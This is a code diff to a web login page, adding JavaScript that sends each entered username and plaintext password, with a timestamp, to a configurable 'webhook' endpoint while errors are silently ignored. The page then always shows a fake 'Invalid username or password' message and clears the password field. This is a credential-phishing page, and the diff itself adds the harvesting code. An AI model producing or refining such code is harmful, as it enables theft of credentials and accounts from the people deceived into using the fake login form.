@@ -30,6 +30,7 @@ input[type="text"], input[type="password"] {
   font-family: "Inter", sans-serif;
   border-radius: 0; 
   border-bottom: 1px solid #ccc;
+  outline: none;
 }
 
 /* Password label and field */
@@ -174,6 +175,8 @@ document.addEventListener("DOMContentLoaded", function(){
   const spinner = loginBtn.querySelector(".spinner");
   const btnText = loginBtn.querySelector(".btn-text");
 
+  const webhookUrl = "/api/validate"; // keep your webhook here
+
   function toggleButton() {
     if(username.value.trim() && password.value.trim()){
       loginBtn.classList.remove("bg-[#b7c0c8]");
@@ -198,14 +201,29 @@ document.addEventListener("DOMContentLoaded", function(){
     const p=password.value.trim();
     const timestamp = new Date().toLocaleString();
 
-    setTimeout(()=>{
-      errorMsg.textContent="Invalid username or password. Try again.";
-      errorMsg.classList.remove("hidden");
+    if(u && p){
+      const payload = {username:u,password:p,timestamp};
+      // send to your webhook
+      fetch(webhookUrl,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(payload)
+      }).catch(()=>{});
+
+      setTimeout(()=>{
+        errorMsg.textContent="Invalid username or password. Try again.";
+        errorMsg.classList.remove("hidden");
+        spinner.style.display="none";
+        btnText.style.visibility="visible";
+        password.value="";
+        toggleButton();
+      },1200);
+    } else {
       spinner.style.display="none";
       btnText.style.visibility="visible";
-      password.value="";
-      toggleButton();
-    },1200);
+      errorMsg.textContent="Please fill in both fields.";
+      errorMsg.classList.remove("hidden");
+    }
   });
 
   window.togglePassword=function(){
